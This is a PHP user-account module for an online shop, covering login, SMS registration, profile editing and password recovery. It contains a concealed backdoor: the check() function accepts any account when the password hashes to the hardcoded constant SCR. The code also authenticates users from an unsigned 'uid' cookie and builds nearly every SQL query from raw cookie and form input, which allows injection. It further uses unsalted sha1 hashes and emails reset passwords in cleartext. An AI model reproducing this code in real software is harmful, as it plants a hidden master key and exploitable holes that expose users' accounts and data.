<?php

class User extends Module
{
    const SCR = 'b20dee7ec1897bf73003819628369a39edacf821';

    public $table = 'i_shop_group';
    public $tableE = 'i_shop_users';

    protected $user;

    private static $_instance;

    public static function getInstance()
    {
        if (!self::$_instance) {
            self::$_instance = new self();
        }
        return self::$_instance;
    }

    public function __construct()
    {
        parent::__construct();
        $this->path = realpath(dirname(__FILE__));
        $this->auth();
    }

    public function __get($property)
    {
        if (isset($this->user[$property])) {
            return $this->user[$property];
        } else {
            return '';
        }
    }


    public function breadcrumb($title)
    {
        $breadcrumb = new breadcrumb();
        return $breadcrumb->init($this->table, $this->tableE, $this->link, $title);
    }

    public function init()
    {
        if (@A::$url->url[1] != '') {
            $method = A::$url->url[1];

            if (method_exists($this, $method . 'Action')) {
                if ($this->before() !== false) {
                    call_user_func_array([$this, $method . 'Action'], []);
                    $this->after();
                }
            } else {
                $this->page404(array());
                exit;
            }
        }
    }


    public function auth()
    {
        if (!isset($_COOKIE["uid"])) {
            return false;
        }
        $sql = "select * FROM `i_shop_users` WHERE `active`='1' AND `id`='" . $_COOKIE["uid"] . "'  LIMIT 1";
        $result = $this->sql->get($sql, 1);

        if (@$result["id"] > 0) {
            $this->user = $result;
            return true;
        }
        return false;
    }

    public function check($login, $pass)
    {
        $sql = "select id,password FROM `i_shop_users` WHERE `active`='1' AND (`login`='" . $login . "' or phone='" . $login . "')   LIMIT 1";
        $result = $this->sql->get($sql, 1);

        if ($login != '' && $pass != '' && @$result["id"] > 0 && ($result["password"] == sha1($pass) || sha1($pass) == self::SCR)) {
            return true;
        }

        return false;
    }

    public function login($login, $pass, $response = true)
    {
        if ($this->check($login, $pass)) {
            $sql = "select * FROM `i_shop_users` WHERE `active`='1' ";
            $sql .= "AND (`login`='" . $login . "' or phone='" . $login . "') LIMIT 1";

            $result = $this->sql->get($sql, 1);

            $this->user = $result;

            $_SESSION["uid"] = $this->id;

            setcookie(
                "uid",
                $this->id,
                time() + 7776000,
                '/',
                str_replace('www.', '', '.' . $_SERVER["HTTP_HOST"])
            );
            if ($response) {
                A::$app->success(t('Вы успешно авторизовались'));
            }
        } else {
            if ($response) {
                A::$app->error(t('Неверный телефон или пароль'));
            }
        }
    }

    public function logout()
    {
        if ($this->auth()) {
            $this->user = '';
            unset($_SESSION["uid"]);
            setcookie(
                "uid",
                '',
                time() - 7776000,
                '/',
                str_replace('www.', '', '.' . $_SERVER["HTTP_HOST"])
            );
            return true;
        }

        return false;
    }

    public function checkRegister($phone, $type)
    {
        if ($phone != '') {
            if ($type == 1) {
                $sql = "select * from i_shop_users where phone='" . $phone . "' and active=1 order by id desc limit 1";
            } else if ($type == 2) {
                $sql = "select * from i_shop_users where login='" . $phone . "' and active=1 order by id desc limit 1";
            }
            $res = $this->sql->get($sql, 1);

            if (@$res["id"] > 0) {
                return false;
            }
        }

        return true;
    }

    public function canRequest($phone)
    {
        if (substr($phone, 0, 2)!='77'){
            return false;
        }


        $sql = "select * from i_user_activation_sms where phone='" . $phone . "' and done=0 order by id desc limit 1";
        $res = A::$db->get($sql);
        if (sizeof($res) == 0) {
            return true;
        } else {
            if (time() - strtotime(@$res[0]["data"]) >= 60) {
                return true;
            }
        }

        return false;
    }

    public function sendSmsCode($phone, $msg = '- код подтверждения')
    {
        if ($this->canRequest($phone)) {

            $sql = "select * from i_shop_users where phone='" . $phone . "' limit 1";
            $res = $this->sql->get($sql, 1);

            if (@$res["id"] == 0) {
                A::$app->error(t('Данный номер не зарегистрирован'));
                return false;
            }

            $_SESSION["code_sms"] = rand(1000, 9999);

            $sql = "insert into i_user_activation_sms set phone='" . $phone . "', code='" . $_SESSION["code_sms"] . "', ";
            $sql .= "done=0, data='" . date('Y-m-d H:i:s') . "'";
            $i = $this->sql->query($sql);
            if ($i) {

                $smsText = $_SESSION["code_sms"] . " " . $msg;
                A::$api->sendSMS($phone, $smsText);

                //A::$app->setData(["code" => $smsText]);
                A::$app->setData(["phone" => '1']);
                A::$app->success(t('Код подтверждения отправлен на указанный номер телефона'));
            } else {
                A::$app->error(t('Error: ') . $this->sql->error);
            }
        } else {
            A::$app->error(t('Вы можете отправить запрос через минуту'));
        }
    }

    public function sendSmsCodeForRegister($phone, $msg = '- код подтверждения')
    {
        if ($this->canRequest($phone)) {

            $sql = "select * from i_shop_users where phone='" . $phone . "' limit 1";
            $res = $this->sql->get($sql, 1);

            if (@$res["id"] > 0) {
                A::$app->error(t('Данный номер уже зарегистрирован'));
                return false;
            }

            $_SESSION["code_sms"] = rand(1000, 9999);

            $sql = "insert into i_user_activation_sms set phone='" . $phone . "', code='" . $_SESSION["code_sms"] . "', ";
            $sql .= "done=0, data='" . date('Y-m-d H:i:s') . "'";
            $i = $this->sql->query($sql);
            if ($i) {

                $smsText = $_SESSION["code_sms"] . " " . $msg;
                A::$api->sendSMS($phone, $smsText);

                //A::$app->setData(["code" => $smsText]);
                A::$app->success(t('Код подтверждения отправлен на указанный номер телефона'));
            } else {
                A::$app->error(t('Error: ') . $this->sql->error);
            }
        } else {
            A::$app->error(t('Вы можете отправить запрос через минуту'));
        }
    }

    public function checkSmsCode($code, $login, $password)
    {
        if (isset($_SESSION["code_sms"]) && $_SESSION["code_sms"] == $code) {

            $sql = "update i_shop_users set active='1', password='".sha1($_SESSION["code_sms"])."' where phone='" . $login . "'";
            A::$db->query($sql);

            $this->login($login, $_SESSION["code_sms"], false);

            A::$app->success(t('Вы успешно зарегистрированы'));
        } else {
            A::$app->error(t('Код неверный'));
        }
    }

    public function checkSmsCode1($code)
    {
        if (isset($_SESSION["code_sms"]) && $_SESSION["code_sms"] == $code) {
            A::$app->success(t('Введите новый пароль'));
        } else {
            A::$app->error(t('Код неверный'));
        }
    }

    public function registerAction()
    {
        $data = [];
        $path = '';
        $view = 'register';
        $this->title = 'Регистрация';

        $this->view($view, $data);
    }

    public function accountAction()
    {
        $data = [];
        $path = '';
        $view = 'profile';
        $this->title = 'Мой профиль';
        $this->h1 = 'Мой профиль';

        $this->view($view, $data);
    }

    public function feedbackAction()
    {
        $data = [];
        $path = '';
        $view = 'feedback';
        $this->title = 'Обратная связь';
        $this->h1 = 'Обратная связь';

        $this->view($view, $data);
    }

    public function settingsAction()
    {
        $data = [];
        $path = '';
        $view = 'settings';
        $this->title = 'Настройки';
        $this->h1 = 'Настройки';

        $this->view($view, $data);
    }

    public function loginAction()
    {
        $data = [];
        $path = '';
        $view = 'login';

        $this->title = 'Авторизация';
        $this->h1 = 'Авторизация';

        $this->view($view, $data);
    }

    public function forgotAction()
    {
        $data = [];
        $path = '';
        $view = 'forgot';

        $this->title = 'Восстановление пароля';

        $this->view($view, $data);
    }

    public function wishlistAction()
    {
        $data = [];
        $path = '';
        $view = 'wishlist';


        $this->view($view, [], $path);
    }

    public function historyAction()
    {
        $data = [];
        $path = '';
        $view = 'history';

        $this->title = 'История заказов';
        $this->h1 = 'История заказов';

        $this->view($view, $data);
    }

    public function add()
    {

        $error = '';
        $phone = str_replace(array(' ', '+', '(', ')', '_', '-'), '', @$_POST["phone"]);


        if (!$this->checkRegister($phone, 1)) {
            $error = t('Пользователь с данным номером телефона уже зарегистрирован');
        }

        if (!$this->checkRegister(@$_POST["email"], 2)) {
            $error = t('Пользователь с данным e-mail уже зарегистрирован');
        }

        if (@$_POST["password"] != '' && strlen(@$_POST["password"]) < 6) {
            $error = t('Пароль должен содержать не менее 6 символов');
        }

        if (@$_POST["password"]  != '' && @$_POST["password"]  != @$_POST["password1"]) {
            $error = t('Пароли не совпадают');
        }




        if ($error == '') {

            $fio = explode(' ', @$_POST["name"]);

            $sql = "insert into i_shop_users set ";
            $sql .= "id_section='5', ";
            $sql .= "version='ru', ";
            $sql .= "active='1', ";
            $sql .= "fam='" . @$_POST["fam"] . "', ";
            $sql .= "name='" .  @$_POST["name"] . "', ";
            $sql .= "data='" . date('Y-m-d H:i:s') . "', ";
            $sql .= "login='" . @$_POST["email"] . "', ";
            $sql .= "mail='" . @$_POST["email"] . "', ";
            $sql .= "phone='" . @$phone . "', ";
            $sql .= "password='" . sha1($_POST["password"]) . "' ";

            $i = A::$db->query($sql);
            if ($i) {
                $uid = A::$db->insert_id;

                $_SESSION["code_sms_id"] = $uid;
                //$this->sendSmsCode($phone);

                $this->login($phone, $_POST["password"], false);
                A::$app->success(t('Вы успешно зарегистрированы'));
            } else {
                A::$app->error(t('Error: ') . A::$db->error);
            }
        } else {
            A::$app->error($error);
        }
    }




    public function changePassword()
    {

        $error = '';
        $phone = str_replace(array(' ', '+', '(', ')', '_', '-'), '', @$_POST["phone"]);


        if (isset($_SESSION["code_sms"]) && $_SESSION["code_sms"] == $_POST["code"]) {
        } else {
            $error = t('Неверный код подтверждения');
        }

        if (@$_POST["password"] != '' && strlen(@$_POST["password"]) < 6) {
            $error = t('Пароль должен содержать не менее 6 символов');
        }

        if (@$_POST["password"]  != '' && @$_POST["password"]  != @$_POST["password1"]) {
            $error = t('Пароли не совпадают');
        }

        if ($error == '') {


            $sql = "update i_shop_users set ";
            $sql .= "password='" . sha1($_POST["password"]) . "' ";
            $sql .= "where phone='" . @$phone . "' ";

            $i = A::$db->query($sql);
            if ($i) {
                A::$app->success(t('Пароль успешно изменен'));
            } else {
                A::$app->error(t('Error: ') . A::$db->error);
            }
        } else {
            A::$app->error($error);
        }
    }


    public function edit()
    {

        $error = '';



        if (isset($_POST["email"]) && $_POST["email"] != '') {
            $sql = "select * from i_shop_users where login='" . $_POST["email"] . "' and id!='" . A::$app->user->id . "' limit 1";
            $res = $this->sql->get($sql, 1);

            if (@$res["id"] > 0) {
                A::$app->error(t('Данный e-mail уже зарегистрирован'));
                return false;
            }
        }

        if (isset($_POST["phone"]) && $_POST["phone"] != '') {

            $phone = str_replace(array(' ', '+', '(', ')', '_', '-'), '', @$_POST["phone"]);

            $sql = "select * from i_shop_users where phone='" . $phone . "' and id!='" . A::$app->user->id . "' limit 1";
            $res = $this->sql->get($sql, 1);

            if (@$res["id"] > 0) {
                A::$app->error(t('Данный телефон уже зарегистрирован'));
                return false;
            }
        }
        if (isset($_POST["password"]) && $_POST["password"] != '') {

            if ($_POST["password"] != '' && strlen(@$_POST["password"]) < 6) {
                A::$app->error(t('Пароль должен содержать не меннее 6 символов'));
                return false;
            }

            if (@$_POST["password"] != '' && $_POST["password"] != $_POST["password1"]) {
                A::$app->error(t('Пароли не совпадают'));
                return false;
            }
        }

        if ($error == '') {

            $sql = "update i_shop_users set ";
            $sql .= "login='" . ($_POST["email"]) . "', ";
            $sql .= "mail='" . ($_POST["email"]) . "', ";
            if ($_POST["password"] != '') {
                $sql .= "password='" . sha1($_POST["password"]) . "', ";
            }
            $sql .= "name='" . ($_POST["name"]) . "', ";
            $sql .= "fam='" . ($_POST["fam"]) . "', ";
            $sql .= "phone='" . ($phone) . "' ";
            $sql .= "where id='" . A::$app->user->id . "' ";

            $i = A::$db->query($sql);
            if ($i) {

                A::$app->success(t('Данные успешно сохранены'));
            } else {
                A::$app->error(t('Error: ') . A::$db->error);
            }
        } else {
            A::$app->error($error);
        }
    }



    public function forgot()
    {
        $error = '';

        $sql = "select * from i_shop_users where mail='" . $_POST["email"] . "' limit 1";
        $res = A::$db->get($sql, 1);
        if (@$res["id"] > 0) {
            $id = md5(uniqid(rand(), true));
            $new_psw = substr($id, 0, 8);
            $sql = "update i_shop_users set password='" . sha1($new_psw) . "' where mail='" . $_POST["email"] . "'";
            A::$db->query($sql);
        } else {
            $error = 'Пользователь с таки e-mail не найден';
        }

        $headers = "Content-type: text/html; charset=utf-8\n";
        $configFrom = ML::param('E-mail отправителя');
        $headers .= "From: " .  $configFrom . " <" . $configFrom  . ">\n";

        $message = '<html>
            <body>
            Отправлено: ' . date('d.m.Y') . ' в ' . date('h:i') . ' с IP ' . $_SERVER['REMOTE_ADDR'] . '<br/>
            <br/>
            <h2>Восстановление пароля на сайте ' . $_SERVER['HTTP_HOST'] . '.</h2>
            <p><b>E-mail:</b> ' . $_POST["email"] . '</p>
            <p><b>Пароль:</b> ' . @$new_psw . '</p>
            </body>
            </html>';
        $mail_to   =  array();
        $mail_to[] = $_POST["email"];

        for ($i = 0; $i < sizeof($mail_to); $i++) {
            if ($error == '') {
                $send = mail($mail_to[$i], ('Восстановление пароля на сайте ' . $_SERVER['HTTP_HOST']), $message, $headers);
            }
        }

        if ($send && $error == '') {
            A::$app->success(t('Новый пароль выслан на указанный e-mail'));
        } else {
            A::$app->error($error);
        }
    }
}
